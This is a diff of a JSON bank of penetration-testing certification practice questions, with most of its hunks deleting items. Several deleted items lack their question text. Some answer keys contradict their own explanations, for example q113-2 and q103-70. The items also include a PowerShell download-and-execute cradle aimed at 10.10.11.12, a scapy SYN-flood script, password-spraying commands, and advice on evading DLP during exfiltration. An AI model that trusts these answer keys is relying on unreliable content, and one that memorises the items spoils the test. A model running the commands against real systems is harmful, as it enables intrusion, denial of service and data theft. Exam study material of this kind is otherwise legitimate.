@@ -252,20 +252,6 @@
     "category": "1.0"
   },
   {
-    "id": "q103-20",
-    "number": 20,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "IAM credentials",
-      "B": "SSH key for cloud instance",
-      "C": "Cloud storage credentials",
-      "D": "Temporary security credentials (STS)"
-    },
-    "answer": "A",
-    "explanation": "IAM (Identity and Access Management) credentials are used to control and manage access to\ncloud services and resources. When a penetration tester obtains IAM credentials, especially\nthose with administrative privileges, they can perform high-level operations such as provisioning\nservices, modifying configurations, or accessing sensitive data across the cloud environment.\n* SSH keys would only grant access to a specific instance, not cloud-wide services.\n* Cloud storage credentials are limited to storage access, not administrative capabilities.\n* Temporary security credentials (STS) provide limited-time access and are not typically used for\nbroad administrative tasks.",
-    "category": "1.0"
-  },
-  {
     "id": "q103-21",
     "number": 21,
     "question": "A penetration tester is working on a security assessment of a mobile application that was developed in-house for local use by a hospital. The hospital and its customers are very concerned about disclosure of information. Which of the following tasks should the penetration tester do first?",
@@ -378,20 +364,6 @@
     "category": "1.0"
   },
   {
-    "id": "q103-30",
-    "number": 30,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "Secure distribution",
-      "B": "Peer review",
-      "C": "Use AI",
-      "D": "Goal reprioritization"
-    },
-    "answer": "B",
-    "explanation": "A peer review process ensures that a penetration test report is accurate, unbiased, and free from\nerrors.\n* Peer review (Option B):\n* Senior security professionals verify findings, risk levels, and remediation recommendations.\n* Reduces the risk of misinterpretation or incorrect data in reports.",
-    "category": "2.0"
-  },
-  {
     "id": "q103-31",
     "number": 31,
     "question": "A penetration tester is preparing a password-spraying attack against a known list of users for the company \"example\". The tester is using the following list of commands: * pw-inspector -i sailwords -t 8 -S pass * spray365.py spray -ep plan * users=\"~/user.txt\"; allwords=\"~/words.txt\"; pass=\"~/passwords.txt\"; plan=\"~/spray.plan\" * spray365.py generate --password-file $pass --userfile $user --domain \"example.com\" -- execution-plan $plan * cew -m 5 \"http://www.example.com\" -w sailwords Which of the following is the correct order for the list of the commands?",
@@ -501,20 +473,6 @@
     },
     "answer": "A",
     "explanation": "Hunter.io is a tool used for finding professional email addresses associated with a domain. Here's\nwhat it provides:\n* Functionality of Hunter.io:\n* Email Address Collection: Gathers email addresses associated with a target domain from\nvarious sources across the internet.\n* Verification: Validates the email addresses to ensure they are deliverable.\n* Sources: Aggregates data from public sources, company websites, and other internet\ndatabases.\n* Comparison with Other Options:\n* DNS Records (B): Hunter.io does not focus on DNS records; tools like dig or nslookup are used\nfor DNS information.\n* Data Breach Information (C): Services like Have I Been Pwned are used for data breach\ninformation.\n* Web Page Information (D): Tools like wget, curl, or specific web scraping tools are used for\ncollecting detailed web page information.\nHunter.io is specifically designed to collect and validate email addresses for a given domain,\nmaking it the correct answer.",
-    "category": "1.0"
-  },
-  {
-    "id": "q103-40",
-    "number": 40,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "curl https://api.shodan.io/shodan/host/search?key=<API_KEY>&query=hostname:<target>",
-      "B": "proxychains nmap -sV -T2 <target>",
-      "C": "for i in <target>; do curl -k $i; done",
-      "D": "nmap -sV -T2 <target>"
-    },
-    "answer": "A",
-    "explanation": "* Option A uses Shodan's API to gather information about a target without directly touching the\ntarget system. This makes it the stealthiest option as there's no traffic generated from the tester's\nIP to the target.\n* Options B & D use Nmap which is active scanning, and while -T2 reduces intensity, it still\ngenerates packets.\n* Option C is a custom curl script that also interacts directly with the target and can trigger IDS\nalerts.\nCompTIA PenTest+ Reference:\n* PT0-003 Objective 2.1 & 2.3: Passive vs Active reconnaissance techniques.\n* Using OSINT sources like Shodan is a key stealth recon method.",
     "category": "1.0"
   },
   {
@@ -644,20 +602,6 @@
     "category": "1.0"
   },
   {
-    "id": "q103-50",
-    "number": 50,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "dig +short A AAAA local.domain",
-      "B": "nslookup local.domain",
-      "C": "dig axfr @local.dns.server",
-      "D": "nslookup -server local.dns.server local.domain *"
-    },
-    "answer": "C",
-    "explanation": "La opcion C, dig axfr @local.dns.server, realiza una transferencia de zona DNS (Zone Transfer).\nSi el servidor DNS esta mal configurado y permite este tipo de solicitudes, el atacante puede\nobtener todos los registros DNS del dominio interno.\nLa opcion A muestra solo registros A/AAAA. La B no hace enumeracion completa. La D no es\nvalida como sintaxis.\nReferencia: PT0-003 Objective 3.3 - Perform domain enumeration using dig and DNS zone\ntransfer techniques.",
-    "category": "1.0"
-  },
-  {
     "id": "q103-52",
     "number": 52,
     "question": "During an assessment, a penetration tester exploits an SQLi vulnerability. Which of the following commands would allow the penetration tester to enumerate password hashes?",
@@ -768,20 +712,6 @@
     },
     "answer": "E",
     "explanation": "For electronic locking mechanisms, traditional lock picking is ineffective. Instead, bypassing\ntechniques are often used, such as:\n* Triggering the emergency release.\n* Using a shim or bypass tool.\n* Exploiting wiring faults or RFID vulnerabilities.\nThis method doesn't involve human deception (impersonation), social engineering (tailgating), or\ncausing interference (jamming). It focuses on exploiting the electronic door system without\nneeding to \"unlock\" it traditionally.\nCompTIA PenTest+ Reference:\n* PT0-003 Objective 1.3: Given a scenario, perform a physical assessment.\n* CompTIA emphasizes the distinction between bypassing and other physical intrusion methods.",
-    "category": "2.0"
-  },
-  {
-    "id": "q103-60",
-    "number": 60,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "DAST",
-      "B": "SAST",
-      "C": "IAST",
-      "D": "SCA"
-    },
-    "answer": "A",
-    "explanation": "* Dynamic Application Security Testing (DAST):\n* DAST tools interact with the running application from the outside, simulating attacks to identify\nsecurity vulnerabilities.\n* They are particularly effective in identifying issues like SQL injection, XSS, CSRF, and other\nvulnerabilities in web applications.\n* DAST tools do not require access to the source code, making them suitable for black-box\ntesting.\n* Advantages of DAST:\n* Real-World Testing: DAST simulates real-world attacks by interacting with the application in the\nsame way a user would.\n* Comprehensive Coverage: Can identify vulnerabilities in all parts of the web application,\nincluding input fields, forms, and user interactions.\n* Automated Scanning: Automates the process of testing and identifying vulnerabilities, providing\ndetailed reports on discovered issues.\n* Examples of DAST Tools:\n* OWASP ZAP (Zed Attack Proxy): An open-source DAST tool widely used for web application\nsecurity testing.\n* Burp Suite: A popular commercial DAST tool that provides comprehensive scanning and testing\ncapabilities.\nPentest References:\n* Web Application Testing: Understanding the importance of testing web applications for security\nvulnerabilities and the role of different testing methodologies.\n* Security Testing Tools: Familiarity with various security testing tools and their applications in\npenetration testing.\n* DAST vs. SAST: Knowing the difference between DAST (dynamic testing) and SAST (static\ntesting) and when to use each method.\nBy using a DAST tool, the penetration tester can effectively identify all vulnerable input fields on\nthe customer website, ensuring a thorough assessment of the application's security.",
     "category": "2.0"
   },
   {
@@ -911,20 +841,6 @@
     "category": "1.0"
   },
   {
-    "id": "q103-70",
-    "number": 70,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "exploit/windows/smb/psexec",
-      "B": "exploit/windows/smb/ms08_067_netapi",
-      "C": "exploit/windows/smb/ms17_010_eternalblue",
-      "D": "auxiliary/scanner/snmp/snmp_login"
-    },
-    "answer": "A",
-    "explanation": "Since the system is running Windows 7 SP0, it is highly likely to be vulnerable to MS17-010\n(EternalBlue), a critical SMB vulnerability used for remote code execution (RCE).\n* Option A (psexec) #: PsExec requires valid credentials, which we do not have yet.\n* Option B (ms08_067_netapi) #: MS08-067 targets Windows XP/Server 2003, but the system is\nWindows 7.\n* Option C (ms17_010_eternalblue) #: Correct.\n* EternalBlue allows remote exploitation of SMBv1 in Windows 7/Server 2008.\n* Option D (snmp_login scanner) #: Only checks default SNMP credentials, not an exploit.\n# Reference: CompTIA PenTest+ PT0-003 Official Guide - SMB Exploitation & EternalBlue",
-    "category": "3.0"
-  },
-  {
     "id": "q103-71",
     "number": 71,
     "question": "During an engagement, a penetration tester wants to enumerate users from Linux systems by using finger and rwho commands. However, the tester realizes these commands alone will not achieve the desired result. Which of the following is the best tool to use for this task?",
@@ -1049,20 +965,6 @@
     },
     "answer": "A",
     "explanation": "Web shells provide remote access and persistence for attackers. The best mitigation is to remove\npersistence mechanisms.\n* Remove the persistence mechanisms (Option A):\n* Attackers often modify startup scripts, cron jobs, or registry keys to maintain access.\n* If persistence is not removed, even after the web shell is deleted, attackers can reinstall or\nreaccess it.",
-    "category": "1.0"
-  },
-  {
-    "id": "q103-80",
-    "number": 80,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "Service discovery",
-      "B": "OS fingerprinting",
-      "C": "Host discovery",
-      "D": "DNS enumeration"
-    },
-    "answer": "C",
-    "explanation": "In network penetration testing, the initial steps involve gathering information to build an\nunderstanding of the network's structure, devices, and potential entry points. The process\ngenerally follows a structured approach, starting from broad discovery methods to more specific\nidentification techniques. Here's a comprehensive breakdown of the steps:\n* Host Discovery:\n* Objective: Identify live hosts on the network.\n* Tools & Techniques:\n* Ping Sweep: Using tools like nmap with the -sn option (ping scan) to check for live hosts by\nsending ICMP Echo requests.\n* ARP Scan: Useful in local networks, arp-scan can help identify all devices on the local subnet by\nbroadcasting ARP requests.\nnmap -sn 192.168.1.0/24\n* References:\n* The GoBox HTB write-up emphasizes the importance of identifying hosts before moving to\nservice enumeration.\n* The Forge HTB write-up also highlights using Nmap for initial host discovery in its enumeration\nphase.\nService Discovery (Option A):\n* Objective: After identifying live hosts, determine the services running on them.\n* Tools & Techniques:\n* Nmap: Often used with options like -sV for version detection to identify services.\nnmap -sV 192.168.1.100\n* References:\n* As seen in multiple write-ups (e.g., Anubis HTB and Bolt HTB), service discovery follows host\nidentification to understand the services available for potential exploitation.\nOS Fingerprinting (Option B):\n* Objective: Determine the operating system of the identified hosts.\n* Tools & Techniques:\n* Nmap: With the -O option for OS detection.\nnmap -O 192.168.1.100\n* References:\n* Accurate OS fingerprinting helps tailor subsequent attacks and is often performed after host and\nservice discovery, as highlighted in the write-ups.\nDNS Enumeration (Option D):\n* Objective: Identify DNS records and gather subdomains related to the target domain.\n* Tools & Techniques:\n* dnsenum, dnsrecon, and dig.\ndnsenum example.com\n*",
     "category": "1.0"
   },
   {
@@ -1191,20 +1093,6 @@
     "answer": "D",
     "explanation": "Hidden form fields in web applications can store user roles, session tokens, and security\nparameters that attackers may exploit.\n* HTML scraping (Option D):\n* Involves analyzing HTML source code to find hidden fields like:\n<input type=\"hidden\" name=\"admin_access\" value=\"true\">\nAttackers use tools like Burp Suite, ZAP, or browser developer tools (Ctrl+U or Inspect Element)\nto locate hidden fields.",
     "category": "1.0"
-  },
-  {
-    "id": "q103-90",
-    "number": 90,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "Bypass defensive systems to collect more information.",
-      "B": "Use an automation tool to perform the attacks.",
-      "C": "Script exploits to gain access to the systems and host.",
-      "D": "Validate the results and remove false positives."
-    },
-    "answer": "D",
-    "explanation": "The command snmpwalk -v 2c -c public 192.168.1.23 is used to query SNMP (Simple Network\nManagement Protocol) data from a device. Here's the purpose in the context provided:\n* SNMP Enumeration:\n* Function: snmpwalk is used to retrieve a large amount of information from the target device\nusing SNMP.\n* Version: -v 2c specifies the SNMP version.\n* Community String: -c public specifies the community string, which is essentially a password for\nSNMP queries.\n* Purpose of the Command:\n* Validate Results: The tester uses SNMP to gather detailed information about the network\ndevices to confirm the findings of the vulnerability scanner and remove any false positives.\n* Detailed Information: SNMP can provide detailed information about device configurations,\nnetwork interfaces, and other settings that can validate the scanner's results.\n* Comparison with Other Options:\n* Bypassing Defensive Systems (A): Not directly related to SNMP enumeration.\n* Using Automation Tools (B): While SNMPwalk is automated, the primary purpose here is\nvalidation.\n* Script Exploits (C): SNMPwalk is not used for scripting exploits but for information gathering.\nBy using snmpwalk, the tester is validating the results from the vulnerability scanner and\nremoving any false positives, ensuring accurate reporting.",
-    "category": "2.0"
   },
   {
     "id": "q103-91",
@@ -1390,62 +1278,6 @@
     "category": "1.0"
   },
   {
-    "id": "q113-1",
-    "number": 1,
-    "question": "Given the following script: $1 = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.split(\"\\\")[1] If ($1 -eq \"administrator\") { echo IEX(New-Object Net.WebClient).Downloadstring('http://10.10.11.12:8080/ul/windows.ps1') | powershell -noprofile -} Which of the following is the penetration tester most likely trying to do?",
-    "options": {
-      "A": "Change the system's wallpaper based on the current user's preferences.",
-      "B": "Capture the administrator's password and transmit it to a remote server.",
-      "C": "Conditionally stage and execute a remote script.",
-      "D": "Log the internet browsing history for a systems administrator."
-    },
-    "answer": "C",
-    "explanation": "Script Breakdown:\n$1 = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.split(\"\\\")[1]: Retrieves the\ncurrent username.\nIf ($1 -eq \"administrator\"): Checks if the current user is \"administrator\".\necho IEX(New-Object Net.WebClient).Downloadstring('http://10.10.11.12:8080/ul/windows.ps1') |\npowershell -noprofile -}: If the user is \"administrator\", downloads and executes a PowerShell\nscript from a remote server.\nPurpose:\nConditional Execution: Ensures the script runs only if executed by an administrator.\nRemote Script Execution: Uses IEX (Invoke-Expression) to download and execute a script from a\nremote server, a common method for staging payloads.\nWhy This is the Best Choice:\nThis script aims to conditionally download and execute a remote script based on the user's\nprivileges. It is designed to stage further attacks or payloads only if the current user has\nadministrative privileges.\nReferences from Pentesting Literature:\nThe technique of conditionally executing scripts based on user privileges and using remote script\nexecution is discussed in penetration testing guides and is a common tactic in various HTB write-\nups.\nReferences:\nPenetration Testing - A Hands-on Introduction to Hacking\nHTB Official Writeups",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-2",
-    "number": 2,
-    "question": "Which of the following is most important when communicating the need for vulnerability remediation to a client at the conclusion of a penetration test?",
-    "options": {
-      "A": "Articulation of cause",
-      "B": "Articulation of impact",
-      "C": "Articulation of escalation",
-      "D": "Articulation of alignment"
-    },
-    "answer": "A",
-    "explanation": "When concluding a penetration test, effectively communicating the need for vulnerability\nremediation is crucial. Here's why the articulation of impact is the most important aspect:\nArticulation of Cause (Option A):\nThis involves explaining the root cause of the vulnerabilities discovered during the penetration\ntest.\nImportance: While understanding the cause is essential for long-term remediation and prevention,\nit does not directly convey the urgency or potential consequences of the vulnerabilities.\nArticulation of Impact (Option B):\nThis involves describing the potential consequences and risks associated with the vulnerabilities.\nIt includes the possible damage, such as data breaches, financial losses, reputational damage,\nand operational disruptions.\nImportance: The impact provides the client with a clear understanding of the severity and urgency\nof the issues. It helps prioritize remediation efforts based on the potential damage that could be\ninflicted if the vulnerabilities are exploited.\nReferences: Penetration testing reports and communications that emphasize the impact are more\nlikely to drive action from stakeholders. By focusing on the real-world implications of the\nvulnerabilities, clients can see the necessity for prompt remediation.\nArticulation of Escalation (Option C):\nprivileges or cause more significant issues.\nImportance: While escalation paths are important to understand, they are part of the broader\nimpact assessment. They explain how an attacker might exploit the vulnerability further but do not\nconvey the immediate risk as clearly as impact.\nArticulation of Alignment (Option D):\npolicies, compliance requirements, or business objectives.\nImportance: Alignment is useful for ensuring that remediation efforts are in line with the client's\nstrategic goals and regulatory requirements. However, it still doesn't highlight the immediate\nurgency and potential damage like the articulation of impact does.\nConclusion: Articulating the impact of vulnerabilities is the most crucial element when\ncommunicating the need for remediation. By clearly explaining the potential risks and\nconsequences, penetration testers can effectively convey the urgency and importance of\naddressing the discovered issues, thus motivating clients to take prompt and appropriate action.",
-    "category": "3.0"
-  },
-  {
-    "id": "q113-3",
-    "number": 3,
-    "question": "During a security assessment, a penetration tester uses a tool to capture plaintext log-in credentials on the communication between a user and an authentication system. The tester wants to use this information for further unauthorized access. Which of the following tools is the tester using?",
-    "options": {
-      "A": "Burp Suite",
-      "B": "Wireshark",
-      "C": "Zed Attack Proxy",
-      "D": "Metasploit"
-    },
-    "answer": "B",
-    "explanation": "Wireshark is a network packet analyzer used to capture and analyze network traffic in real-time.\nDuring a penetration test, it is often used to inspect unencrypted communication to extract\nsensitive information like plaintext login credentials. Here's how it works:\n* Packet Capturing:Wireshark captures the network packets transmitted over a network interface.\nIf a user logs in through an insecure communication protocol (e.g., HTTP, FTP, or Telnet), the\ncredentials are transmitted in plaintext.\n* Traffic Filtering:Using filters (e.g., http, tcp.port == 21), the tester narrows down the relevant\ntraffic to locate the login request and response packets.\n* Sensitive Data Extraction:Analyzing the captured packets reveals plaintext credentials in the\ndata payload, such as in HTTP POST requests.\n* Exploit the Information:After extracting the plaintext credentials, the tester can attempt\nunauthorized access to resources using these credentials.\nCompTIA Pentest+ References:\n* Domain 1.0 (Planning and Scoping)\n* Domain 2.0 (Information Gathering and Vulnerability Identification)\n* Wireshark Usage Guide",
-    "category": "3.0"
-  },
-  {
-    "id": "q113-4",
-    "number": 4,
-    "question": "During an engagement, a penetration tester wants to enumerate users from Linux systems by using finger and rwho commands. However, the tester realizes these commands alone will not achieve the desired result. Which of the following is the best tool to use for this task?",
-    "options": {
-      "A": "Nikto",
-      "B": "Burp Suite",
-      "C": "smbclient",
-      "D": "theHarvester"
-    },
-    "answer": "C",
-    "explanation": "The smbclient tool is used to access SMB/CIFS resources on a network. It allows penetration\ntesters to connect to shared resources and enumerate users on a network, particularly in\nWindows environments. While finger and rwho are more common on Unix/Linux systems,\nsmbclient provides better functionality for enumerating users across a network.\nUnderstanding smbclient:\nPurpose: smbclient is used to access and manage files and directories on SMB/CIFS servers.\nCapabilities: It allows for browsing shared resources, listing directories, downloading and\nuploading files, and enumerating users.\nUser Enumeration:\nCommand: Use smbclient with the -L option to list available shares and users.\nStep-by-Step Explanationsmbclient -L //target_ip -U username\nExample: Enumerating users on a target system.\nsmbclient -L //192.168.50.2 -U anonymous\nAdvantages:\nComprehensive: Provides detailed information about shared resources and users.\nCross-Platform: Can be used on both Linux and Windows systems.\nReferences from Pentesting Literature:\nSMB enumeration is a common practice discussed in penetration testing guides for identifying\nshared resources and users in a network environment.\nHTB write-ups frequently mention the use of smbclient for enumerating network shares and\nusers.\nReferences:\nPenetration Testing - A Hands-on Introduction to Hacking\nHTB Official Writeups",
-    "category": "2.0"
-  },
-  {
     "id": "q113-5",
     "number": 5,
     "question": "A penetration tester currently conducts phishing reconnaissance using various tools and accounts for multiple intelligence-gathering platforms. The tester wants to consolidate some of the tools and accounts into one solution to analyze the output from the intelligence-gathering tools. Which of the following is the best tool for the penetration tester to use?",
@@ -1488,34 +1320,6 @@
     "category": "1.0"
   },
   {
-    "id": "q113-8",
-    "number": 8,
-    "question": "Which of the following is within the scope of proper handling and most crucial when working on a penetration testing report?",
-    "options": {
-      "A": "Keeping both video and audio of everything that is done",
-      "B": "Keeping the report to a maximum of 5 to 10 pages in length",
-      "C": "Basing the recommendation on the risk score in the report",
-      "D": "Making the report clear for all objectives with a precise executive summary"
-    },
-    "answer": "D",
-    "explanation": "* Importance of a Clear Executive Summary:\n* The executive summary is essential because it provides decision-makers with a concise\noverview of the findings, risks, and recommendations without requiring deep technical knowledge.\n* Clarity in objectives ensures that all stakeholders understand the purpose, scope, and outcomes\nof the test.\n* Why Not Other Options?\n* A: Keeping video and audio records is helpful during testing but not typically included in the final\nreport for handling purposes.\n* B: Limiting the report to 5-10 pages may compromise its comprehensiveness and omit critical\ndetails.\n* C: Recommendations based solely on the risk score may not address the broader context or\norganizational priorities.\nCompTIA Pentest+ References:\n* Domain 5.0 (Reporting and Communication)",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-10",
-    "number": 10,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "Use steganography and send the file over FTP",
-      "B": "Compress the file and send it using TFTP",
-      "C": "Split the file in tiny pieces and send it over dnscat",
-      "D": "Encrypt and send the file over HTTPS"
-    },
-    "answer": "D",
-    "explanation": "When considering efficiency and security for exfiltrating sensitive data, the chosen method must\nensure data confidentiality and minimize the risk of detection. Here's an analysis of each option:\nUse steganography and send the file over FTP (Option A):\nSteganography hides data within other files, such as images. FTP is a protocol for transferring\nfiles.\nDrawbacks: FTP is not secure as it transmits data in clear text, making it susceptible to\ninterception.\nSteganography can add an extra layer of obfuscation, but the use of FTP makes this option\ninsecure.\nCompress the file and send it using TFTP (Option B):\nTFTP is a simple file transfer protocol that lacks encryption.\nDrawbacks: TFTP is inherently insecure because it does not support encryption, making it easy\nfor attackers to intercept the data during transfer.\nSplit the file in tiny pieces and send it over dnscat (Option C):\ndnscat is a tool for tunneling data over DNS.\nDrawbacks: While effective at evading detection by using DNS, splitting the file and managing the\nreassembly adds complexity. Additionally, large data transfers over DNS can raise suspicion.\nEncrypt and send the file over HTTPS (Answer: D):\nEncrypting the file ensures that its contents are protected during transfer. HTTPS provides a\nsecure, encrypted channel for communication over the internet.\nAdvantages: HTTPS is widely used and trusted, making it less likely to raise suspicion.\nEncryption ensures the data remains confidential during transit.\nReferences:\nThe use of HTTPS for secure data transfer is a standard practice in cybersecurity, providing both\nencryption and integrity of the data being transmitted.\nConclusion: Encrypting the file and sending it over HTTPS is the most efficient and secure\nmethod for exfiltrating sensitive data, ensuring both confidentiality and reducing the risk of\ndetection.",
-    "category": "1.0"
-  },
-  {
     "id": "q113-11",
     "number": 11,
     "question": "During a testing engagement, a penetration tester compromises a host and locates data for exfiltration. Which of the following are the best options to move the data without triggering a data loss prevention tool? (Select two).",
@@ -1529,20 +1333,6 @@
     "answer": "B",
     "explanation": "Data Loss Prevention (DLP) tools monitor sensitive data and prevent unauthorized exfiltration.\nThe two best options to bypass DLP are:\nCompress and encrypt the data (Option B):\nCompression reduces file size, making detection harder. Encryption further protects the data by\nmaking it unreadable without a key.\nDLP tools often inspect content based on known patterns (e.g., credit card numbers, sensitive\nkeywords).\nEncrypted files bypass content inspection since DLP cannot analyze encrypted data.\nReference: CompTIA PenTest+ PT0-003 Official Study Guide - \"Data Exfiltration Techniques\"\nEncode the data as Base64 (Option E):\nBase64 encoding disguises data by converting it into ASCII text, making it less likely to trigger\nDLP signature-based detection.\nMany DLP systems do not analyze encoded text deeply, assuming it is non-sensitive.\nReference: CompTIA PenTest+ PT0-003 Official Study Guide - \"Encoding and Obfuscation in\nExfiltration\" Incorrect options:\nOption A (USB flash drive): Physical exfiltration is risky and easily detectable in enterprise\nenvironments.\nOption C (Rename file extensions): DLP systems analyze content, not just filenames.\nOption D (FTP for exfiltration): FTP is monitored by security tools and is a high-risk method.\nOption F (Trusted service): Many organizations monitor outbound traffic to cloud storage or email\nservices.",
     "category": "2.0"
-  },
-  {
-    "id": "q113-12",
-    "number": 12,
-    "question": "A penetration tester needs to confirm the version number of a client's web application server. Which of the following techniques should the penetration tester use?",
-    "options": {
-      "A": "SSL certificate inspection",
-      "B": "URL spidering",
-      "C": "Banner grabbing",
-      "D": "Directory brute forcing"
-    },
-    "answer": "C",
-    "explanation": "Banner grabbing is a technique used to obtain information about a network service, including its\nversion number, by connecting to the service and reading the response.\n* Understanding Banner Grabbing:\n* Purpose: Identify the software version running on a service by reading the initial response\nbanner.\n* Methods: Can be performed manually using tools like Telnet or automatically using tools like\nNmap.\n* Manual Banner Grabbing:\nStep-by-Step Explanationtelnet target_ip 80\n* Netcat: Another tool for banner grabbing.\nnc target_ip 80\n* Automated Banner Grabbing:\n* Nmap: Use Nmap's version detection feature to grab banners.\nnmap -sV target_ip\n* Benefits:\n* Information Disclosure: Quickly identify the version and sometimes configuration details of the\nservice.\n* Targeted Exploits: Helps in selecting appropriate exploits based on the identified version.\n* References from Pentesting Literature:\n* Banner grabbing is a fundamental technique in reconnaissance, discussed in various\npenetration testing guides.\n* HTB write-ups often include banner grabbing as a step in identifying the version of services.\nReferences:\n* Penetration Testing - A Hands-on Introduction to Hacking\n* HTB Official Writeups",
-    "category": "1.0"
   },
   {
     "id": "q113-13",
@@ -1601,20 +1391,6 @@
     "category": "1.0"
   },
   {
-    "id": "q113-17",
-    "number": 17,
-    "question": "A penetration tester needs to evaluate the order in which the next systems will be selected for testing. Given the following output: Hostname | IP address | CVSS 2.0 | EPSS hrdatabase | 192.168.20.55 | 9.9 | 0.50 financesite | 192.168.15.99 | 8.0 | 0.01 legaldatabase | 192.168.10.2 | 8.2 | 0.60 fileserver | 192.168.125.7 | 7.6 | 0.90 Which of the following targets should the tester select next?",
-    "options": {
-      "A": "fileserver",
-      "B": "hrdatabase",
-      "C": "legaldatabase",
-      "D": "financesite"
-    },
-    "answer": "A",
-    "explanation": "Given the output, the penetration tester should select the fileserver as the next target for testing,\nconsidering both CVSS and EPSS scores.\n* CVSS (Common Vulnerability Scoring System):\n* Purpose: CVSS provides a numerical score to represent the severity of vulnerabilities, helping to\nprioritize remediation efforts.\n* Higher Scores: Indicate more severe vulnerabilities.\n* EPSS (Exploit Prediction Scoring System):\n* Purpose: EPSS estimates the likelihood that a vulnerability will be exploited in the wild within the\nnext 30 days.\n* Higher Scores: Indicate a higher likelihood of exploitation.\n* Evaluation:\n* hrdatabase: CVSS = 9.9, EPSS = 0.50\n* financesite: CVSS = 8.0, EPSS = 0.01\n* legaldatabase: CVSS = 8.2, EPSS = 0.60\n* fileserver: CVSS = 7.6, EPSS = 0.90\n* The fileserver has the highest EPSS score, indicating a high likelihood of exploitation, despite\nhaving a slightly lower CVSS score compared to hrdatabase and legaldatabase.\nPentest References:\n* Prioritization: Balancing between severity (CVSS) and exploitability (EPSS) is crucial for\neffective vulnerability management.\n* Risk Assessment: Evaluating both the impact and the likelihood of exploitation helps in making\ninformed decisions about testing priorities.\nBy selecting the fileserver, which has a high EPSS score, the penetration tester focuses on a\ntarget that is more likely to be exploited, thereby addressing the most immediate risk.",
-    "category": "3.0"
-  },
-  {
     "id": "q113-18",
     "number": 18,
     "question": "A penetration tester needs to exploit a vulnerability in a wireless network that has weak encryption to perform traffic analysis and decrypt sensitive information. Which of the following techniques would best allow the penetration tester to have access to the sensitive information?",
@@ -1627,34 +1403,6 @@
     "answer": "C",
     "explanation": "If a wireless network uses weak encryption (e.g., WEP), attackers can capture and analyze\npackets to extract sensitive data.\nPacket sniffing (Option C):\nTools like Wireshark, Aircrack-ng, and Kismet capture network packets.\nAttackers analyze captured traffic to decrypt WEP encryption or extract plaintext credentials.\nReference: CompTIA PenTest+ PT0-003 Official Study Guide - \"Wireless Network Attacks and\nSniffing\" Incorrect options:\nOption A (Bluejacking): Sends unsolicited Bluetooth messages, not for network sniffing.\nOption B (SSID spoofing): Involves creating a fake access point, but does not analyze traffic.\nOption D (ARP poisoning): Used for MITM attacks, but not specific to wireless traffic analysis.",
     "category": "3.0"
-  },
-  {
-    "id": "q113-19",
-    "number": 19,
-    "question": "During a pre-engagement activity with a new customer, a penetration tester looks for assets to test. Which of the following is an example of a target that can be used for testing?",
-    "options": {
-      "A": "API",
-      "B": "HTTP",
-      "C": "IPA",
-      "D": "ICMP"
-    },
-    "answer": "A",
-    "explanation": "* API as a Target:\n* APIs (Application Programming Interfaces) are common assets to test for vulnerabilities such as\nimproper authentication, data leakage, or injection attacks.\n* Testing APIs often uncovers critical issues in modern applications.\n* Why Not Other Options?\n* B (HTTP): This is a protocol, not a specific asset.\n* C (IPA): Unrelated to penetration testing (likely a typo or irrelevant here).\n* D (ICMP): This is a protocol used for network diagnostics, not an application asset.\nCompTIA Pentest+ References:\n* Domain 1.0 (Planning and Scoping)",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-20",
-    "number": 20,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "Configure a network scanner engine and execute the scan.",
-      "B": "Execute a testing framework to validate vulnerabilities on the devices.",
-      "C": "Configure a port mirror and review the network traffic.",
-      "D": "Run a network mapper tool to get an understanding of the devices."
-    },
-    "answer": "C",
-    "explanation": "When testing a power plant's network and needing to avoid disruption to the grid, configuring a\nport mirror and reviewing the network traffic is the most appropriate method to identify\nvulnerabilities without causing disruptions.\n* Port Mirroring:\n* Definition: Port mirroring (SPAN - Switched Port Analyzer) is a method of monitoring network\ntraffic by duplicating packets from one or more switch ports to another port where a monitoring\ndevice is connected.\n* Purpose: Allows passive monitoring of network traffic without impacting network operations or\ndevice performance.\n* Avoiding Disruption:\n* Non-Intrusive: Port mirroring is non-intrusive and does not generate additional traffic or load on\nthe network devices, making it suitable for sensitive environments like power plants where\ndisruption is not acceptable.\n* Other Options:\n* Network Scanner Engine: Active scanning might disrupt network operations or devices, which is\nnot suitable for critical infrastructure.\n* Testing Framework: Validating vulnerabilities on devices might involve active testing, which can\nbe disruptive.\n* Network Mapper Tool: Running a network mapper tool (like Nmap) actively scans the network\nand might disrupt services.\nPentest References:\n* Passive Monitoring: Passive techniques such as port mirroring are essential in environments\nwhere maintaining operational integrity is critical.\n* Critical Infrastructure Security: Understanding the need for non-disruptive methods in critical\ninfrastructure penetration testing to ensure continuous operations.\nBy configuring a port mirror and reviewing network traffic, the penetration tester can identify\nvulnerabilities in the power plant's network without risking disruption to the grid.",
-    "category": "2.0"
   },
   {
     "id": "q113-21",
@@ -1671,48 +1419,6 @@
     "category": "1.0"
   },
   {
-    "id": "q113-22",
-    "number": 22,
-    "question": "A penetration tester is authorized to perform a DoS attack against a host on a network. Given the following input: ip = IP(\"192.168.50.2\") tcp = TCP(sport=RandShort(), dport=80, flags=\"S\") raw = RAW(b\"X\"*1024) p = ip/tcp/raw send(p, loop=1, verbose=0) Which of the following attack types is most likely being used in the test?",
-    "options": {
-      "A": "MDK4",
-      "B": "Smurf attack",
-      "C": "FragAttack",
-      "D": "SYN flood"
-    },
-    "answer": "D",
